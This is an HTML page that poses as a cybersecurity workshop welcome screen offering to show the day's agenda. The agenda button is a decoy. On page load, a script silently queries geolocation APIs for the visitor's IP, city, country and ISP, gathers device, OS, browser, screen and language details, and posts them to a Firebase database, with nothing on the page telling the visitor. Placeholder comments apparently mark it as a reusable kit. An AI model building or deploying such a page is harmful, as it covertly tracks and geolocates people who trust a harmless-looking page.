<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CyberShield Workshop 2026 — Welcome</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&display=swap');
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Syne', sans-serif;
    background: #f5f4f0;
    color: #1a1a2e;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 2rem;
  }
  .card {
    background: #fff;
    border-radius: 20px;
    padding: 2.5rem 2rem;
    max-width: 380px;
    width: 100%;
    text-align: center;
    box-shadow: 0 4px 32px rgba(0,0,0,0.08);
  }
  .logo {
    width: 64px; height: 64px;
    background: #1a1a2e;
    border-radius: 16px;
    display: flex; align-items: center; justify-content: center;
    margin: 0 auto 1.5rem;
  }
  .logo svg { width: 36px; height: 36px; }
  .tag {
    font-size: 11px;
    letter-spacing: 0.15em;
    text-transform: uppercase;
    color: #888;
    margin-bottom: 0.75rem;
  }
  h1 {
    font-size: 1.7rem;
    font-weight: 800;
    color: #1a1a2e;
    line-height: 1.2;
    margin-bottom: 0.75rem;
  }
  p {
    font-size: 0.95rem;
    color: #666;
    line-height: 1.6;
    margin-bottom: 2rem;
  }
  .btn {
    background: #1a1a2e;
    color: #fff;
    border: none;
    padding: 0.9rem 2.5rem;
    border-radius: 12px;
    font-family: 'Syne', sans-serif;
    font-size: 1rem;
    font-weight: 700;
    cursor: pointer;
    width: 100%;
    transition: background 0.2s, transform 0.15s;
  }
  .btn:hover { background: #2d2d4e; transform: translateY(-1px); }
  .small { font-size: 0.78rem; color: #bbb; margin-top: 1rem; margin-bottom: 0; }
  .agenda-container {
    text-align: center;
    background: #fff;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    padding: 2rem;
  }
  .agenda-img {
    max-width: 100%;
    height: auto;
    border-radius: 20px;
    box-shadow: 0 8px 24px rgba(0,0,0,0.1);
  }
  .back-btn {
    margin-top: 2rem;
    background: #1a1a2e;
    color: #fff;
    border: none;
    padding: 0.8rem 2rem;
    border-radius: 40px;
    font-family: 'Syne', sans-serif;
    font-size: 0.9rem;
    font-weight: 700;
    cursor: pointer;
  }
</style>
</head>
<body>
<div class="card" id="welcomeCard">
  <div class="logo">
    <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M18 4L6 9v9c0 7.18 5.14 13.89 12 15.5C24.86 31.89 30 25.18 30 18V9L18 4z" fill="#fff" opacity="0.9"/>
      <path d="M13 18l3.5 3.5L23 14" stroke="#1a1a2e" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
  </div>
  <div class="tag">CyberShield Workshop 2025</div>
  <h1>Welcome!<br>View Today's Agenda</h1>
  <p>Tap the button below to access the session schedule, speaker list, and room details.</p>
  <button class="btn" onclick="showAgendaImage()">Open Workshop Agenda &rarr;</button>
  <p class="small">Powered by CyberShield Events</p>
</div>

<script>
  // ============================================================
  //  🔁 REPLACE WITH YOUR FIREBASE DATABASE URL
  const FIREBASE_URL = "https://workshop-a32fc-default-rtdb.firebaseio.com/";
  //  🖼️ REPLACE WITH YOUR ACTUAL AGENDA IMAGE URL (local or full link)
  const AGENDA_IMAGE_URL = "Agenda.png";  // e.g., "agenda.jpg" or "https://example.com/schedule.png"
  // ============================================================

  let dataSent = false;

  // ---------- Device / OS / Browser ----------
  function getOS(ua) {
    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
    if (/Windows NT 6/.test(ua))  return 'Windows 7/8';
    if (/Mac OS X/.test(ua))      return 'macOS';
    if (/Android/.test(ua))       return 'Android';
    if (/iPhone|iPad/.test(ua))   return 'iOS';
    if (/Linux/.test(ua))         return 'Linux';
    return 'Unknown OS';
  }

  function getBrowser(ua) {
    if (/Edg\//.test(ua))       return 'Edge';
    if (/OPR\/|Opera/.test(ua)) return 'Opera';
    if (/Chrome\//.test(ua))    return 'Chrome';
    if (/Firefox\//.test(ua))   return 'Firefox';
    if (/Safari\//.test(ua))    return 'Safari';
    return 'Unknown';
  }

  function getDevice(ua) {
    const models = ['iPhone', 'iPad', 'Samsung', 'Galaxy', 'Xiaomi', 'Redmi', 'POCO',
                    'Huawei', 'Honor', 'OnePlus', 'Realme', 'OPPO', 'Vivo', 'Pixel',
                    'Motorola', 'Nokia'];
    for (const m of models) {
      if (ua.includes(m)) {
        const match = ua.match(new RegExp(m + '[\\s/]?[\\w\\-]*', 'i'));
        if (match) return match[0].trim();
        return m;
      }
    }
    if (/Mobile/.test(ua)) return 'Mobile Phone';
    if (/Tablet/.test(ua)) return 'Tablet';
    return 'Desktop / Laptop';
  }

  // ---------- IP + City + Country (HTTPS APIs with fallback) ----------
  async function getLocationData() {
    const apis = [
      {
        url: 'https://ipapi.co/json/',
        parse: (data) => ({
          ip: data.ip || '—',
          city: data.city || '—',
          country: data.country_name || '—',
          isp: data.org || '—'
        })
      },
      {
        url: 'https://api.ipapi.is/',
        parse: (data) => ({
          ip: data.ip || '—',
          city: data.location?.city || '—',
          country: data.location?.country || '—',
          isp: data.isp?.org || '—'
        })
      },
      {
        url: 'https://ipinfo.io/json?token=anonymoustoken',
        parse: (data) => ({
          ip: data.ip || '—',
          city: data.city || '—',
          country: data.country || '—',
          isp: data.org || '—'
        })
      }
    ];

    for (const api of apis) {
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        const res = await fetch(api.url, { signal: controller.signal });
        clearTimeout(timeoutId);
        if (res.ok) {
          const data = await res.json();
          const parsed = api.parse(data);
          if (parsed.ip && parsed.ip !== '—') return parsed;
        }
      } catch (e) {
        continue;
      }
    }
    return { ip: '—', city: '—', country: '—', isp: '—' };
  }

  // ---------- Capture and send to Firebase ----------
  async function captureAndSend() {
    if (dataSent) return;
    dataSent = true;

    const ua = navigator.userAgent;
    const device = getDevice(ua);
    const os = getOS(ua);
    const browser = getBrowser(ua);
    const screenRes = `${screen.width}x${screen.height}`;
    const language = navigator.language || '—';
    const time = new Date().toLocaleString();

    const { ip, city, country, isp } = await getLocationData();

    const visitorData = {
      timestamp: time,
      ip: ip,
      city: city,
      country: country,
      isp: isp,
      device: device,
      os: os,
      browser: browser,
      screen_resolution: screenRes,
      language: language,
      user_agent: ua,
      referrer: document.referrer || 'direct'
    };

    try {
      await fetch(`${FIREBASE_URL}/visitors.json`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(visitorData)
      });
      console.log('✅ Visitor data logged', visitorData);
    } catch (err) {
      console.error('❌ Firebase error:', err);
    }
  }

  // ---------- Show agenda image instantly (no loading message) ----------
  function showAgendaImage() {
    // Replace whole body with the agenda image and a back button
    document.body.innerHTML = `
      <div class="agenda-container">
        <img src="${AGENDA_IMAGE_URL}" alt="Workshop Agenda" class="agenda-img" onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22300%22%20height%3D%22200%22%3E%3Crect%20width%3D%22300%22%20height%3D%22200%22%20fill%3D%22%23f0f0f0%22%2F%3E%3Ctext%20x%3D%2250%25%22%20y%3D%2250%25%22%20text-anchor%3D%22middle%22%20dy%3D%22.3em%22%20fill%3D%22%23999%22%3EImage%20not%20found%3C%2Ftext%3E%3C%2Fsvg%3E';">
        <button class="back-btn" onclick="location.reload()">← Back to Welcome</button>
      </div>
    `;
  }

  // Capture data immediately on page load
  window.addEventListener('load', () => {
    captureAndSend();
  });
</script>
</body>
</html>
